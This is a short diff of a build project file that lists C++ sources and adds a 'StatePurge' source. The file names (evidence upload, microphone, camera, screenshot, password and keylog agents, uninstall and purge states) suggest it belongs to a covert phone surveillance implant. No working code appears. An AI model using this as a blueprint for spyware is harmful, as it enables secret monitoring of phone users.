@@ -30,7 +30,7 @@ SOURCE AbstractAction.cpp AbstractState.cpp ActionFactory.cpp ActionNone.cpp Act
 SOURCE ActionEvent.cpp ActionAgent.cpp
 SOURCE StateCmdUninstall.cpp StateNone.cpp StateNewConfFeedback.cpp
 SOURCE StateAuthentication.cpp StateIdentification.cpp StateEvidences.cpp StateBye.cpp 
-SOURCE StateNewConf.cpp StateFileSystem.cpp StateDownload.cpp StateUpload.cpp StateUpgrade.cpp
+SOURCE StateNewConf.cpp StateFileSystem.cpp StateDownload.cpp StateUpload.cpp StateUpgrade.cpp StatePurge.cpp
 SOURCE AbstractAgent.cpp AgentAddressbook.cpp AgentCalendar.cpp AgentNone.cpp AgentPosition.cpp 
 SOURCE AgentScreenshot.cpp AgentFactory.cpp AgentDevice.cpp AgentMic.cpp AgentApplication.cpp AgentCallList.cpp 
 SOURCE AgentCallLocal.cpp AgentCamera.cpp LogFile.cpp AgentPassword.cpp AgentCrisis.cpp //AgentKeylog.cpp
